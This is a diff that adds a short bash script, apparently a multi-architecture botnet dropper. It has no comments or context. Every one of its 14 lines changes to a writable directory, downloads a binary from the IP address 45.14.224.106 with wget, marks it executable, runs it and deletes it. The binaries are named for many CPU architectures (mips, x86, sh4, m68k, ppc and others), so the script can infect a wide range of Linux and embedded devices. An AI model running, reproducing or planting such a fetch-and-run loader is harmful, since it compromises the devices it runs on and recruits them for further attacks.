@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pup4; chmod +x pup4; ./pup4; rm -rf pup4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pup4t; chmod +x pup4t; ./pup4t; rm -rf pup4t
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pup5; chmod +x pup5; ./pup5; rm -rf pup5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pup6; chmod +x pup6; ./pup6; rm -rf pup6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupi686; chmod +x pupi686; ./pupi686; rm -rf pupi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupm68; chmod +x pupm68; ./pupm68; rm -rf pupm68
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupmips; chmod +x pupmips; ./pupmips; rm -rf pupmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupmpsl; chmod +x pupmpsl; ./pupmpsl; rm -rf pupmpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupppc; chmod +x pupppc; ./pupppc; rm -rf pupppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupspc; chmod +x pupspc; ./pupspc; rm -rf pupspc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupx86; chmod +x pupx86; ./pupx86; rm -rf pupx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupsh4; chmod +x pupsh4; ./pupsh4; rm -rf pupsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pup7; chmod +x pup7; ./pup7; rm -rf pup7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.106/pupmips64; chmod +x pupmips64; ./pupmips64; rm -rf pupmips64
